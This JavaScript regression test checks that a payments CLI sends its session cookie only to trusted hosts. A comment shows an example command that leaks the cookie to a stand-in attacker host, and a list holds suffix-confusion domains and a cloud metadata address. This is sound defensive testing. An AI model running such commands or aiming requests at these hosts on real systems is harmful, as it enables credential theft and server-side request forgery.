"use strict";
// Security regression: the session cookie must never travel to a host outside
// the trust list.
//
// `--api-base <url>` and `furlpay api GET <absolute-url>` both let a caller aim
// the CLI at any host. The cookie used to be attached unconditionally, which
// turned a convenience flag into credential exfiltration:
//
//   furlpay api GET https://attacker.example/x  →  Cookie: furlpay_session=...
//
// These cases pin the boundary, including the suffix-confusion tricks that a
// naive `endsWith("furlpay.com")` would wave through.

const assert = require("assert");
const { isCredentialedTarget } = require("../lib/api.js");

const trusted = [
  "https://furlpay.com/api/overview",
  "https://api.furlpay.com/v1/x",
  "https://sandbox.furlpay.com/x",
  "http://localhost:8787/api/x", // dev server: not attacker-reachable
  "http://127.0.0.1:3000/api/x",
];

const untrusted = [
  "https://attacker.example/steal",
  "http://furlpay.com/api/x", // right host, cleartext → cookie would leak on-path
  "https://furlpay.com.evil.example/x", // suffix confusion
  "https://evilfurlpay.com/x", // no dot before furlpay.com
  "https://furlpay.com.attacker.io/x",
  "http://169.254.169.254/latest/meta-data", // cloud metadata (SSRF-flavoured)
];

let failures = 0;

for (const url of trusted) {
  const got = isCredentialedTarget(new URL(url));
  if (got !== true) {
    failures++;
    console.error(`FAIL (should be credentialed): ${url}`);
  }
}

for (const url of untrusted) {
  const got = isCredentialedTarget(new URL(url));
  if (got !== false) {
    failures++;
    console.error(`FAIL (must NOT be credentialed): ${url}`);
  }
}

assert.strictEqual(failures, 0, `${failures} credential-trust case(s) failed`);
console.log(`credential-trust: ${trusted.length + untrusted.length} cases passed`);
